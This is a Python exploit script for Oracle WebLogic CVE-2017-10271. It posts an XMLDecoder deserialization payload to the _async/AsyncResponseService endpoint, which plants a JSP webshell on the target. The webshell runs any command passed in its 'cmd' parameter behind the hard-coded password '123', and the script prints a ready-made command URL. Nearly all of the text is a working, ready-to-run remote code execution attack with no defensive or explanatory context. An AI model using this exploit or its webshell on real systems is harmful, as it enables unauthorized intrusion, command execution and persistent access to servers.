import requests
import sys
# url = "http://10.10.20.166:7001/_async/AsyncResponseService"

url = sys.argv[1]
url_dir = "/_async/AsyncResponseService"
vuln_url = url + url_dir
print vuln_url
print '''
              _         _          _ _ 
             | |       | |        | | |
__      _____| |__  ___| |__   ___| | |
\ \ /\ / / _ \ '_ \/ __| '_ \ / _ \ | |
 \ V  V /  __/ |_) \__ \ | | |  __/ | |
  \_/\_/ \___|_.__/|___/_| |_|\___|_|_|
                                       
               By jas502n        
               
        No Pactch  For  CVE-2017-10271
        
       _async/AsyncResponseService RCE  
       webshell for linux windows                
'''

write_dir="servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/"
shell_name=sys.argv[2]
shell_dir = write_dir + shell_name
print "shell_dir= %s" % shell_dir
proxies = {"http": "http://127.0.0.1:8080"}
payload = '''
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">
<soapenv:Header><wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<java version="1.8.0_131" class="java.beans.xmlDecoder"><object class="java.io.PrintWriter">
<string>%s</string>
<void method="println"><string><![CDATA[
<%%
    if("123".equals(request.getParameter("pwd"))){
        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();
        int a = -1;          
        byte[] b = new byte[1024];          
        out.print("<pre>");          
        while((a=in.read(b))!=-1){
            out.println(new String(b));          
        }
        out.print("</pre>");
    } 
    %%>]]>
</string></void><void method="close"/></object></java></work:WorkContext></soapenv:Header><soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>
''' % shell_dir
# print payload
headers = {
    'Accept-Encoding': "gzip, deflate",
    'SOAPAction': "",
    'Accept': "*/*",
    'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0",
    'Connection': "keep-alive",
    'content-type': "text/xml",
    'Content-Length': "1139",
    'Cache-Control': "no-cache",
    'cache-control': "no-cache"
    }



response = requests.request("POST", vuln_url, data=payload, headers=headers,proxies=proxies)
print "\n\nWebshell: \n"
print url + "/bea_wls_internal/" + shell_name + "?pwd=123&cmd=whoami"
print(response.text)
